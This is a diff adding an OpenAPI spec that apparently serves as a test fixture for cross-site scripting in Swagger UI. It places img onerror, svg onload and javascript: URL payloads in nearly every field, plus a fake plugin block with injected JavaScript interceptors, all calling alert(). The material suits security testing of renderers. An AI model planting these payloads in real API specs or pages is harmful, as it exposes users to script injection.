@@ -1,0 +1,45 @@
+openapi: 3.0.0
+info:
+  title: XSS via Swagger UI Plugin Injection
+  version: 1.0.0
+  description: |
+    Attempting plugin-based code injection.
+    <img src=x onerror=alert('info_desc_executed')>
+  x-logo:
+    url: javascript:alert('x-logo')
+externalDocs:
+  description: '<svg onload=alert("externalDocs")>'
+  url: "javascript:alert('externalDocs_url')"
+servers:
+  - url: https://api.example.com
+    description: <img src=x onerror=alert('server_desc')>
+paths:
+  /pwn:
+    get:
+      summary: Attempt plugin injection
+      description: <img src=x onerror=alert('path_desc')>
+      responses:
+        '200':
+          description: <img src=x onerror=alert('response_desc')>
+          content:
+            application/json:
+              example:
+                data: "ok"
+components:
+  securitySchemes:
+    oauth2:
+      type: oauth2
+      flows:
+        implicit:
+          authorizationUrl: javascript:alert('oauth2')
+          scopes:
+            read: Just read
+x-plugins:
+  - components:
+      requestInterceptor: "function(request) { alert('plugin RCE'); return request; }"
+      responseInterceptor: "function(response) { alert('plugin RESPONSE'); return response; }"
+      wrapComponents:
+        info: "function(Original, system) { return function(props) { alert('wrap info'); return Original(props); } }"
+security:
+  - oauth2:
+      - read
